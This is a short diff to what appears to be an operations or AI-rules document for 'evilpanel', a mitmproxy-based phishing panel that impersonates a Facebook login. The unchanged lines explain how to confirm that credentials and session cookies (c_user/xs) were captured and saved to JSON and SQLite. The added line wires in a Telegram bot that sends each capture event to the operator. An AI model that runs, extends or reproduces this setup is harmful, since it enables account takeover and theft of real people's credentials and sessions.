@@ -135,6 +135,7 @@ When rules are active, AI responses follow this pattern:
 - Verify: `tail -f /opt/evilpanel/logs/mitmproxy.log | grep -Ei "FBSESS|CRED|SESSION|HDR-REQ|HDR-RESP"`.
 - Success path: CTA → login → “Save your login info?” screen; `[SESSION]` with `c_user/xs` and entries in `data/sessions.json` + SQLite.
 - 502 recovery: check `journalctl -u evilpanel` for addon syntax errors; ensure addons list includes `FacebookSessionAddon`.
+- Telegram notifier (opt-in): configure `/opt/evilpanel/config/telegram.yaml` (template in `evilpanel/config/telegram.yaml.template`), enable `enabled: true`, set bot token/chat id. Non-blocking queue sends capture events; replay failures via `python3 -m evilpanel.scripts.replay_failed_telegram`.
 
 ## Version
 - **Version:** 1.0.0
